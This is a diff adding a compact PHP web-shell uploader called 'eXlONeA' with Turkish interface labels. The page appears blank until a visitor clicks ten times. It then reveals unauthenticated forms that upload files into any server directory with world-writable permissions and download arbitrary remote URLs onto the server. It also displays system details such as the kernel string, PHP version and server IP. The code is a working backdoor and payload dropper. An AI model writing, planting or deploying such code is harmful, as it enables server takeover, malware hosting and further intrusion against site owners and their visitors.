@@ -1,0 +1,23 @@
+<?php
+error_reporting(0);set_time_limit(0);ini_set('memory_limit','-1');session_start();
+$d=realpath($_GET['dir']??getcwd())?:getcwd();
+function gU($p){$r=realpath($_SERVER['DOCUMENT_ROOT']);return($r&&strpos($p,$r)===0)?((isset($_SERVER['HTTPS'])?'https':'http').'://'.$_SERVER['HTTP_HOST'].str_replace([$r,'\\'],['','/'],$p)):0;}
+$e=$s='';if(($_GET['a']??'')=='u'){$uD=$d;if(($_POST['cf']??'')=='y'&&!empty($_POST['fn'])){$uD.='/'.$_POST['fn'];if(!is_dir($uD))@mkdir($uD,0777,true);}
+if($_POST['t']=='f'){foreach($_FILES['up']['name'] as $i=>$n){$t=$_FILES['up']['tmp_name'][$i];$o=$uD.'/'.$n;if(move_uploaded_file($t,$o)){@chmod($o,0777);$l=gU($o);$s.="$n ok ".($l?"<a href='$l' target='_blank'>[Aç]</a>":"")."<br>";}else{$e.="$n hata<br>";}}}
+elseif($_POST['t']=='u'){foreach(explode("\n",$_POST['us']) as $u){$u=trim($u);if(filter_var($u,4352)){$n=$uD.'/'.(basename(parse_url($u,5))?:'f_'.time());if(file_put_contents($n,file_get_contents($u))){@chmod($n,0777);$s.="ok: $n<br>";}else{$e.="err: $u<br>";}}}}}
+if(isset($_GET['open']))$_SESSION['o']=1;
+$v=isset($_SESSION['o']);
+?>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative&display=swap" rel="stylesheet"><style>body{background:<?=($v?'#f8f9fa':'#fff')?>;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-size:13px;user-select:none;margin:0}.m{width:100%;max-width:700px;padding:15px;display:<?=($v?'block':'none')?>}.h{font-family:"Cinzel Decorative";text-align:center;font-size:2.5rem}.f{color:#6c757d;text-align:center;margin-top:15px}.i{position:fixed;top:10px;right:10px;cursor:pointer;font-size:22px}</style></head><body>
+<div class="m" id="X"><div class="i"><i class="bi bi-info-circle-fill text-primary" onclick="sI()"></i></div><h1 class="h">eXlONeA</h1><?=($e?"<div class='alert alert-danger'>$e</div>":"").($s?"<div class='alert alert-success'>$s</div>":"")?>
+<div class="card"><div class="card-body"><div class="form-check form-switch mb-2"><input class="form-check-input" type="checkbox" id="c" onchange="t()"><label>Klasör Oluştur</label></div><input type="text" id="n" class="form-control mb-2" style="display:none" placeholder="Ad" oninput="u()"><ul class="nav nav-tabs"><li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#f">Dosya</button></li><li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#u">URL</button></li></ul>
+<div class="tab-content pt-2"><div class="tab-pane fade show active" id="f"><form method="POST" action="?a=u&dir=<?=urlencode($d)?>" enctype="multipart/form-data"><input type="hidden" name="t" value="f"><input type="hidden" name="cf" id="c1"><input type="hidden" name="fn" id="n1"><input type="file" name="up[]" class="form-control mb-2" multiple required><button class="btn btn-primary w-100">Yükle</button></form></div>
+<div class="tab-pane fade" id="u"><form method="POST" action="?a=u&dir=<?=urlencode($d)?>"><input type="hidden" name="t" value="u"><input type="hidden" name="cf" id="c2"><input type="hidden" name="fn" id="n2"><textarea name="us" class="form-control mb-2" placeholder="Linkler"></textarea><button class="btn btn-primary w-100">İndir</button></form></div></div></div></div><div class="f">Copyright © Exlonea - 2025</div></div>
+<div class="modal fade" id="M"><div class="modal-dialog"><div class="modal-content"><div class="modal-body" id="B"></div></div></div></div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+let k=0;<?php if(!$v): ?>document.onclick=()=>{if(++k==10)fetch('?open').then(()=>{document.getElementById('X').style.display='block';document.body.style.background='#f8f9fa'})};<?php endif; ?>
+function t(){let e=document.getElementById('c').checked;document.getElementById('n').style.display=e?'block':'none';document.getElementById('c1').value=document.getElementById('c2').value=e?'y':'n'}
+function u(){document.getElementById('n1').value=document.getElementById('n2').value=document.getElementById('n').value}
+function sI(){const s=<?=json_encode(['u'=>php_uname(),'p'=>phpversion(),'i'=>$_SERVER['SERVER_ADDR']??'N/A'])?>;document.getElementById('B').innerHTML=`Sistem: ${s.u}<br>PHP: ${s.p}<br>IP: ${s.i}`;new bootstrap.Modal(document.getElementById('M')).show()}
+</script></body></html>
